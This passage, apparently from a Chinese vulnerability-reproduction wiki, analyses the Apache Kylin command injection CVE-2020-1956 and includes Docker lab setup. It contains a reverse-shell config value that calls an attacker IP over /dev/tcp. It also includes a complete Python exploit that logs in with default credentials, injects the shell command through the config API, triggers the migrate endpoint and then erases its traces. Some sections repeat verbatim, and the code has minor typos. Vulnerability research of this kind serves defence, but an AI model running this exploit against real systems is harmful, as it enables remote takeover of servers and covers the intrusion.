\u7684\u6e90\u4ee3\u7801\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1,\u51fa\u73b0\u6f0f\u6d1e\u51fd\u6570\u7684\u6587\u4ef6\u4e3a\u4ee5\u4e0b\u8def\u5f84 apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java \u627e\u5230**migrateCube**\u51fd\u6570 @PreAuthorize ( Constant . ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\" ) public void migrateCube ( CubeInstance cube , String projectName ) { KylinConfig config = cube . getConfig (); if ( ! config . isAllowAutoMigrateCube ()) { throw new InternalErrorException ( \"One click migration is disabled, please contact your ADMIN\" ); } for ( CubeSegment segment : cube . getSegments ()) { if ( segment . getStatus () != SegmentStatusEnum . READY ) { throw new InternalErrorException ( \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\" ); } } String srcCfgUri = config . getAutoMigrateCubeSrcConfig (); String dstCfgUri = config . getAutoMigrateCubeDestConfig (); Preconditions . checkArgument ( StringUtils . isNotEmpty ( srcCfgUri ), \"Source configuration should not be empty.\" ); Preconditions . checkArgument ( StringUtils . isNotEmpty ( dstCfgUri ), \"Destination configuration should not be empty.\" ); String stringBuilderstringBuilder = ( \"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\" ); String cmd = String . format ( Locale . ROOT , stringBuilder , KylinConfig . getKylinHome (), srcCfgUri , dstCfgUri , cube . getName (), projectName , config . isAutoMigrateCubeCopyAcl (), config . isAutoMigrateCubePurge ()); logger . info ( \"One click migration cmd: \" + cmd ); CliCommandExecutor exec = new CliCommandExecutor (); PatternedLogger patternedLogger = new PatternedLogger ( logger ); try { exec . execute ( cmd , patternedLogger ); } catch ( IOException e ) { throw new InternalErrorException ( \"Failed to perform one-click migrating\" , e ); } } **PreAuthorize**\u91cc\u9762\u5b9a\u4e49\u4e86\u8def\u7531\u6743\u9650\uff0c**ADMIN**\u6743\u9650\u3001**ADMINISTRATION**\u6743\u9650\u548c**MANAGEMENT**\u6743\u9650\u53ef\u4ee5\u8bbf\u95ee\u8be5service\u3002 @PreAuthorize ( Constant . ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\" ) \u57281087\u884c\u5224\u65ad\u662f\u5426\u5f00\u542f\u4e86**MigrateCube**\u8bbe\u7f6e\uff0c\u5982\u679c\u6ca1\u6709\u5f00\u542f\u5219\u4f1a\u62a5\u9519 \u8ddf\u8fdb isAllowAutoMigrateCube() \u8fd9\u4e2a\u51fd\u6570 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u9ed8\u8ba4\u7684\u914d\u7f6e**kylin.tool.auto-migrate-cube.enabled \u5c31\u662f**Flase public boolean isAllowAutoMigrateCube () { return Boolean . parseBoolean ( getOptional ( \"kylin.tool.auto-migrate-cube.enabled\" , FALSE )); } \u5728\u6ca1\u6709\u5f00\u542f\u914d\u7f6e**kylin.tool.auto-migrate-cube.enabled**\u4e3a**true**\u7684\u60c5\u51b5\u4e0b\uff0c\u8c03\u7528**MigrateCube**\u5219\u4f1a\u51fa\u73b0\u62a5\u9519 \u901a\u8fc7Apache Kylin\u7684SYSTEM\u6a21\u5757\u5f00\u542f**kylin.tool.auto-migrate-cube.enabled**\u4e3a**True** \u8bbe\u7f6e\u540e\u518d\u53bb\u8bf7\u6c42\u5219\u4e0d\u4f1a\u51fa\u73b0\u521a\u521a\u7684\u62a5\u9519\uff0c\u800c\u662f\u51fa\u73b0**Source configuration should not be empty** \u8ddf\u8fdb\u51fa\u73b0\u62a5\u9519\u8bed\u53e5\u7684\u4ee3\u7801\u5757 String srcCfgUri = config . getAutoMigrateCubeSrcConfig (); String dstCfgUri = config . getAutoMigrateCubeDestConfig (); Preconditions . checkArgument ( StringUtils . isNotEmpty ( srcCfgUri ), \"Source configuration should not be empty.\" ); Preconditions . checkArgument ( StringUtils . isNotEmpty ( dstCfgUri ), \"Destination configuration should not be empty.\" ); \u8fd9\u91cc\u8fdb\u884c\u4e86\u5bf9**kylin.tool.auto-migrate-cube.src-config**\u548c**kylin.tool.auto-migrate-cube.dest-config**\u7684\u914d\u7f6e\u8fdb\u884c\u4e86\u68c0\u6d4b ,\u5982\u679c\u4e3a\u7a7a\u5219\u4f1a\u51fa\u73b0\u521a\u521a\u7684\u62a5\u9519 \u8ddf\u8fdb **getAutoMigrateCubeSrcConfig()**\u548c**getAutoMigrateCubeDestConfig()**\u51fd\u6570 public String getAutoMigrateCubeSrcConfig () { return getOptional ( \"kylin.tool.auto-migrate-cube.src-config\" , \"\" ); } public String getAutoMigrateCubeDestConfig () { return getOptional ( \"kylin.tool.auto-migrate-cube.dest-config\" , \"\" ); } \u53d1\u73b0\u8fd9\u4e24\u4e2a\u914d\u7f6e\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u56e0\u4e3a\u914d\u7f6e\u5141\u8bb8\u81ea\u5b9a\u4e49\uff0c\u6240\u4ee5srcCfgUri\u548cdstCfgUri\u4e24\u4e2a\u53d8\u91cf\u5747\u662f\u53ef\u63a7\u7684 \u7ee7\u7eed\u5411\u4e0b\u8d70\uff0c\u53d1\u73b0\u4e00\u5904**\u547d\u4ee4\u62fc\u63a5** String stringBuilder = ( \"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\" ); String cmd = String . format ( Locale . ROOT , stringBuilder , KylinConfig . getKylinHome (), srcCfgUri , dstCfgUri , cube . getName (), projectName , config . isAutoMigrateCubeCopyAcl (), config . isAutoMigrateCubePurge ()); logger . info ( \"One click migration cmd: \" + cmd ); CliCommandExecutor exec = new CliCommandExecutor (); PatternedLogger patternedLogger = new PatternedLogger ( logger ); try { exec . execute ( cmd , patternedLogger ); } catch ( IOException e ) { throw new InternalErrorException ( \"Failed to perform one-click migrating\" , e ); } } \u8fdb\u5165\u5230**execute**\u51fd\u6570 private Pair < Integer , String > runRemoteCommand ( String command , Logger logAppender ) throws IOException { SSHClient ssh = new SSHClient ( remoteHost , port , remoteUser , remotePwd ); SSHClientOutput sshOutput ; try { sshOutput = ssh . execCommand ( command , remoteTimeoutSeconds , logAppender ); int exitCode = sshOutput . getExitCode (); String output = sshOutput . getText (); return Pair . newPair ( exitCode , output ); } catch ( IOException e ) { throw e ; } catch ( Exception e ) { throw new IOException ( e . getMessage (), e ); } } private Pair < Integer , String > runNativeCommand ( String command , Logger logAppender ) throws IOException { String [] cmd = new String [ 3 ] ; String osName = System . getProperty ( \"os.name\" ); if ( osName . startsWith ( \"Windows\" )) { cmd [ 0 ] = \"cmd.exe\" ; cmd [ 1 ] = \"/C\" ; } else { cmd [ 0 ] = \"/bin/bash\" ; cmd [ 1 ] = \"-c\" ; } cmd [ 2 ] = command ; ProcessBuilder builder = new ProcessBuilder ( cmd ); builder . redirectErrorStream ( true ); Process proc = builder . start (); BufferedReader reader = new BufferedReader ( new InputStreamReader ( proc . getInputStream (), StandardCharsets . UTF_8 )); String line ; StringBuilder result = new StringBuilder (); while (( line = reader . readLine ()) != null && ! Thread . currentThread (). isInterrupted ()) { result . append ( line ). append ( '\\n' ); if ( logAppender != null ) { logAppender . log ( line ); } } if ( Thread . interrupted ()) { logger . info ( \"CliCommandExecutor is interruppted by other, kill the sub process: \" + command ); proc . destroy (); try { Thread . sleep ( 1000 ); } catch ( InterruptedException e ) { // do nothing } return Pair . newPair ( 1 , \"Killed\" ); } try { int exitCode = proc . waitFor (); return Pair . newPair ( exitCode , result . toString ()); } catch ( InterruptedException e ) { Thread . currentThread (). interrupt (); throw new IOException ( e ); } } } \u7531\u6b64\u53ef\u4ee5\u5f97\u51fa\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e24\u4e2a\u53ef\u63a7\u7684\u53c2\u6570\uff0c\u6267\u884c\u4efb\u610f\u6211\u4eec\u9700\u8981\u7684\u547d\u4ee4\uff0c\u4f8b\u5982\u53cd\u5f39\u4e00\u4e2ashell\uff0c\u8bbe\u7f6e\u7684\u914d\u7f6e\u4e3a [!NOTE] kylin.tool.auto-migrate-cube.enabled=true kylin.tool.auto-migrate-cube.src-config=echo;bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 kylin.tool.auto-migrate-cube.dest-config=shell \u518d\u53bb\u53d1\u9001POST\u8bf7\u6c42 /kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate \u6210\u529f\u53cd\u5f39\u4e00\u4e2ashell \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] POC\u5229\u7528\u524d\u63d0\u662f\u62e5\u6709\u8d26\u53f7\u5bc6\u7801\uff0c\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u662f admin/KYLIN #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Kylin <= 3.0.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-1956 \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:7070 \\033 [0m' ) print ( '+ \\033 [36mLogin >>> admin:KYLIN(\u683c\u5f0f\u4e3aUser:Pass) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str ( input ( \" \\033 [35mPlease input User and Pass \\n Login >>> \\033 [0m\" )) Authorization = \"Basic \" + str (( base64 . b64encode ( user_pass . encode ( 'utf-8' ))), 'utf-8' ) headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Authorization\" : Authorization , \"Cookie\" : \"project=null\" } try : response = requests . post ( url = login_url , headers = headers , timeout = 20 ) if \"password\" not in response . text : print ( \" \\033 [31m[x] \u8d26\u53f7\u5bc6\u7801\u51fa\u73b0\u9519\u8bef \\033 [0m\" ) sys . exit ( 0 ) else : print ( \" \\033 [32m[o] \u6210\u529f\u767b\u5f55\uff0c\u83b7\u5f97JSESSIONID\uff1a\" + response . cookies [ \"JSESSIONID\" ] + \" \\033 [0m\" ) return response . cookies [ \"JSESSIONID\" ], Authorization except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , cookie , IP , PORT , Authorization ): config_url = target_url + \"/kylin/api/admin/config\" key = [ \"kylin.tool.auto-migrate-cube.enabled\" , \"kylin.tool.auto-migrate-cube.src-config\" , \"kylin.tool.auto-migrate-cube.dest-config\" ] value = [ \"true\" , \"echo;bash -i >& /dev/tcp/ {} / {} 0>&1;echo\" . format ( IP , PORT ), \"shell\" ] headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Authorization\" : Authorization , \"Accept\" : \"application/json, text/plain, */*\" , \"Content-Type\" : \"application/json;charset=UTF-8\" , \"Pragma\" : \"no-cache\" , \"Cookie\" : \"project=null;JSESSIONID=\" + cookie } for i in range ( 0 , 3 ): data = \"\"\"{\"key\":\" %s \",\"value\":\" %s \"}\"\"\" % ( key [ i ], value [ i ]) try : response = requests . put ( url = config_url , headers = headers , data = data , timeout = 20 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u5c06\" + key [ i ] + \"\u8bbe\u7f6e\u4e3a\" + value [ i ] + \" \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u8bbe\u7f6e\" + key [ i ] + \"\u4e3a\" + value [ i ] + \"\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , cookie ): print ( \" \\033 [35m[o] \u6b63\u5728\u53cd\u5f39shell...... \\033 [0m\" ) vuln_url = target_url + \"/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate\" headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"project=null;JSESSIONID=\" + cookie } try : response = requests . post ( url = vuln_url , headers = headers ) POC_4 ( target_url , cookie ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_4 ( target_url , cookie ): config_url = target_url + \"/kylin/api/admin/config\" key = [ \"kylin.tool.auto-migrate-cube.enabled\" , \"kylin.tool.auto-migrate-cube.src-config\" , \"kylin.tool.auto-migrate-cube.dest-config\" ] value = [ \"flase\" , \"echo;echo;echo\" , \"None\" ] headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Authorization\" : Authorization , \"Accept\" : \"application/json, text/plain, */*\" , \"Content-Type\" : \"application/json;charset=UTF-8\" , \"Pragma\" : \"no-cache\" , \"Cookie\" : \"project=null;JSESSIONID=\" + cookie } for i in range ( 0 , 3 ): data = \"\"\"{\"key\":\" %s \",\"value\":\" %s \"}\"\"\" % ( key [ i ], value [ i ]) try : response = requests . put ( url = config_url , headers = headers , data = data , timeout = 20 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u5c06\" + key [ i ] + \"\u8bbe\u7f6e\u4e3a\" + value [ i ] + \" \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u8bbe\u7f6e\" + key [ i ] + \"\u4e3a\" + value [ i ] + \"\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) print ( \" \\033 [35m[o] \u6210\u529f\u6e05\u7406\u75d5\u8ff9 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) try : cookie , Authorization = POC_1 ( target_url ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) POC_2 ( target_url , cookie , IP , PORT , Authorization ) POC_3 ( target_url , cookie ) \u53c2\u8003\u6587\u7ae0 \u00b6 Apache Kylin \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-1956 POC \u5206\u6790","title":"Apache Kylin \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-1956"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956/#apache-kylin-\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e-cve-2020-1956","text":"","title":"Apache Kylin \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-1956"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2020\u5e745\u670822\u65e5\uff0c CNVD \u901a\u62a5\u4e86 Apache Kylin \u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-1956 \uff0c\u5730\u5740\u5728 http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133 \u3002 Apache Kylin** \u662f\u7f8e\u56fd Apache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u6b3e\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u5206\u6790\u578b\u6570\u636e\u4ed3\u5e93\u3002\u8be5\u4ea7\u54c1\u4e3b\u8981\u63d0\u4f9b Hadoop/Spark \u4e4b\u4e0a\u7684 SQL \u67e5\u8be2\u63a5\u53e3\u53ca\u591a\u7ef4\u5206\u6790\uff08 OLAP \uff09\u7b49\u529f\u80fd\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956/#\u73af\u5883\u642d\u5efa","text":"\u8fd9\u91cc\u4f7f\u7528 docker \u6765\u642d\u5efa\u9700\u8981\u7684\u73af\u5883 Kylin\u5b98\u65b9\u6587\u6863 docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] \u5982\u679c\u670d\u52a1\u5668\u5185\u5b58\u8f83\u5c0f\uff0c\u53ef\u4e0d\u9009\u62e9 -m 8G \u53c2\u6570 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 \u6253\u5f00\u540e\u4f7f\u7528\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801**admin/KYLIN**\u767b\u5f55\uff0c\u51fa\u73b0\u521d\u59cb\u754c\u9762\u5373\u4e3a\u6210\u529f","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956/#\u6f0f\u6d1e\u5206\u6790","text":"\u67e5\u770b\u8fd9\u4e2a\u6f0f\u6d1e\u4fee\u590d\u7684\u8865\u4e01 \u67e5\u770b\u5730\u5740 \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u6b64\u6f0f\u6d1e\u6709\u5173\u7684\u53c2\u6570\u6709\u4e09\u4e2a\uff0c\u5206\u522b\u662f srcCfgUri \u3001 dstCfgUri \u3001 projectName \uff0c\u76f8\u5173\u7684\u51fd\u6570\u4e3a migrateCube \u5b98\u65b9\u6587\u6863\u4e2d\u5bf9 migrateCube \u7684\u63cf\u8ff0 POST /kylin/api/cubes/{cube}/{project}/migrate \u4e0b\u8f7d Apache Kylin 3.0.1 \u7684\u6e90\u4ee3\u7801\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1,\u51fa\u73b0\u6f0f\u6d1e\u51fd\u6570\u7684\u6587\u4ef6\u4e3a\u4ee5\u4e0b\u8def\u5f84 apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java \u627e\u5230**migrateCube**\u51fd\u6570 @PreAuthorize ( Constant . ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\" ) public void migrateCube ( CubeInstance cube , String projectName ) { KylinConfig config = cube . getConfig (); if ( ! config . isAllowAutoMigrateCube ()) { throw new InternalErrorException ( \"One click migration is disabled, please contact your ADMIN\" ); } for ( CubeSegment segment : cube . getSegments ()) { if ( segment . getStatus () != SegmentStatusEnum . READY ) { throw new InternalErrorException ( \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\" ); } } String srcCfgUri = config . getAutoMigrateCubeSrcConfig (); String dstCfgUri = config . getAutoMigrateCubeDestConfig (); Preconditions . checkArgument ( StringUtils . isNotEmpty ( srcCfgUri ), \"Source configuration should not be empty.\" ); Preconditions . checkArgument ( StringUtils . isNotEmpty ( dstCfgUri ), \"Destination configuration should not be empty.\" ); String stringBuilderstringBuilder = ( \"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\" ); String cmd = String . format ( Locale . ROOT , stringBuilder , KylinConfig . getKylinHome (), srcCfgUri , dstCfgUri , cube . getName (), projectName , config . isAutoMigrateCubeCopyAcl (), config . isAutoMigrateCubePurge ()); logger . info ( \"One click migration cmd: \" + cmd ); CliCommandExecutor exec = new CliCommandExecutor (); PatternedLogger patternedLogger = new PatternedLogger ( logger ); try { exec . execute ( cmd , patternedLogger ); } catch ( IOException e ) { throw new InternalErrorException ( \"Failed to perform one-click migrating\" , e ); } } **PreAuthorize**\u91cc\u9762\u5b9a\u4e49\u4e86\u8def\u7531\u6743\u9650\uff0c**ADMIN**\u6743\u9650\u3001**ADMINISTRATION**\u6743\u9650\u548c**MANAGEMENT**\u6743\u9650\u53ef\u4ee5\u8bbf\u95ee\u8be5service\u3002 @PreAuthorize ( Constant . ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\" ) \u57281087\u884c\u5224\u65ad\u662f\u5426\u5f00\u542f\u4e86**MigrateCube**\u8bbe\u7f6e\uff0c\u5982\u679c\u6ca1\u6709\u5f00\u542f\u5219\u4f1a\u62a5\u9519 \u8ddf\u8fdb isAllowAutoMigrateCube() \u8fd9\u4e2a\u51fd\u6570 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u9ed8\u8ba4\u7684\u914d\u7f6e**kylin.tool.auto-migrate-cube.enabled \u5c31\u662f**Flase public boolean isAllowAutoMigrateCube () { return Boolean . parseBoolean ( getOptional ( \"kylin.tool.auto-migrate-cube.enabled\" , FALSE )); } \u5728\u6ca1\u6709\u5f00\u542f\u914d\u7f6e**kylin.tool.auto-migrate-cube.enabled**\u4e3a**true**\u7684\u60c5\u51b5\u4e0b\uff0c\u8c03\u7528**MigrateCube**\u5219\u4f1a\u51fa\u73b0\u62a5\u9519 \u901a\u8fc7Apache Kylin\u7684SYSTEM\u6a21\u5757\u5f00\u542f**kylin.tool.auto-migrate-cube.enabled**\u4e3a**True** \u8bbe\u7f6e\u540e\u518d\u53bb\u8bf7\u6c42\u5219\u4e0d\u4f1a\u51fa\u73b0\u521a\u521a\u7684\u62a5\u9519\uff0c\u800c\u662f\u51fa\u73b0**Source configuration should not be empty** \u8ddf\u8fdb\u51fa\u73b0\u62a5\u9519\u8bed\u53e5\u7684\u4ee3\u7801\u5757 String srcCfgUri = config . getAutoMigrateCubeSrcConfig (); String dstCfgUri = config . getAutoMigrateCubeDestConfig (); Preconditions . checkArgument ( StringUtils . isNotEmpty ( srcCfgUri ), \"Source configuration should not be empty.\" ); Preconditions . checkArgument ( StringUtils . isNotEmpty ( dstCfgUri ), \"Destination configuration should not be empty.\" ); \u8fd9\u91cc\u8fdb\u884c\u4e86\u5bf9**kylin.tool.auto-migrate-cube.src-config**\u548c**kylin.tool.auto-migrate-cube.dest-config**\u7684\u914d\u7f6e\u8fdb\u884c\u4e86\u68c0\u6d4b ,\u5982\u679c\u4e3a\u7a7a\u5219\u4f1a\u51fa\u73b0\u521a\u521a\u7684\u62a5\u9519 \u8ddf\u8fdb **getAutoMigrateCubeSrcConfig()**\u548c**getAutoMigrateCubeDestConfig()**\u51fd\u6570 public String getAutoMigrateCubeSrcConfig () { return getOptional ( \"kylin.tool.auto-migrate-cube.src-config\" , \"\" ); } public String getAutoMigrateCubeDestConfig () { return getOptional ( \"kylin.tool.auto-migrate-cube.dest-config\" , \"\" ); } \u53d1\u73b0\u8fd9\u4e24\u4e2a\u914d\u7f6e\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u56e0\u4e3a\u914d\u7f6e\u5141\u8bb8\u81ea\u5b9a\u4e49\uff0c\u6240\u4ee5srcCfgUri\u548cdstCfgUri\u4e24\u4e2a\u53d8\u91cf\u5747\u662f\u53ef\u63a7\u7684 \u7ee7\u7eed\u5411\u4e0b\u8d70\uff0c\u53d1\u73b0\u4e00\u5904**\u547d\u4ee4\u62fc\u63a5** String stringBuilder = ( \"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\" ); String cmd = String . format ( Locale . ROOT , stringBuilder , KylinConfig . getKylinHome (), srcCfgUri , dstCfgUri , cube . getName (), projectName , config . isAutoMigrateCubeCopyAcl (), config . isAutoMigrateCubePurge ()); logger . info ( \"One click migration cmd: \" + cmd ); CliCommandExecutor exec = new CliCommandExecutor (); PatternedLogger patternedLogger = new PatternedLogger ( logger ); try { exec . execute ( cmd , patternedLogger ); } catch ( IOException e ) { throw new InternalErrorException ( \"Failed to perform one-click migrating\" , e ); } } \u8fdb\u5165\u5230**execute**\u51fd\u6570 private Pair < Integer , String > runRemoteCommand ( String command , Logger logAppender ) throws IOException { SSHClient ssh = new SSHClient ( remoteHost , port , remoteUser , remotePwd ); SSHClientOutput sshOutput ; try { sshOutput = ssh . execCommand ( command , remoteTimeoutSeconds , logAppender ); int exitCode = sshOutput . getExitCode (); String output = sshOutput . getText (); return Pair . newPair ( exitCode , output ); } catch ( IOException e ) { throw e ; } catch ( Exception e ) { throw new IOException ( e . getMessage (), e ); } } private Pair < Integer , String > runNativeCommand ( String command , Logger logAppender ) throws IOException { String [] cmd = new String [ 3 ] ; String osName = System . getProperty ( \"os.name\" ); if ( osName . startsWith ( \"Windows\" )) { cmd [ 0 ] = \"cmd.exe\" ; cmd [ 1 ] = \"/C\" ; } else { cmd [ 0 ] = \"/bin/bash\" ; cmd [ 1 ] = \"-c\" ; } cmd [ 2 ] = command ; ProcessBuilder builder = new ProcessBuilder ( cmd ); builder . redirectErrorStream ( true ); Process proc = builder . start (); BufferedReader reader = new BufferedReader ( new InputStreamReader ( proc . getInputStream (), StandardCharsets . UTF_8 )); String line ; StringBuilder result = new StringBuilder (); while (( line = reader . readLine ()) != null && ! Thread . currentThread (). isInterrupted ()) { result . append ( line ). append ( '\\n' ); if ( logAppender != null ) { logAppender . log ( line ); } } if ( Thread . interrupted ()) { logger . info ( \"CliCommandExecutor is interruppted by other, kill the sub process: \" + command ); proc . destroy (); try { Thread . sleep ( 1000 ); } catch ( InterruptedException e ) { // do nothing } return Pair . newPair ( 1 , \"Killed\" ); } try { int exitCode = proc . waitFor (); return Pair . newPair ( exitCode , result . toString ()); } catch ( InterruptedException e ) { Thread . currentThread (). interrupt (); throw new IOException ( e ); } } } \u7531\u6b64\u53ef\u4ee5\u5f97\u51fa\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e24\u4e2a\u53ef\u63a7\u7684\u53c2\u6570\uff0c\u6267\u884c\u4efb\u610f\u6211\u4eec\u9700\u8981\u7684\u547d\u4ee4\uff0c\u4f8b\u5982\u53cd\u5f39\u4e00\u4e2ashell\uff0c\u8bbe\u7f6e\u7684\u914d\u7f6e\u4e3a [!NOTE] kylin.tool.auto-migrate-cube.enabled=true kylin.tool.auto-migrate-cube.src-config=echo;bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 kylin.tool.auto-migrate-cube.dest-config=shell \u518d\u53bb\u53d1\u9001POST\u8bf7\u6c42 /kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate \u6210\u529f\u53cd\u5f39\u4e00\u4e2ashell","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] 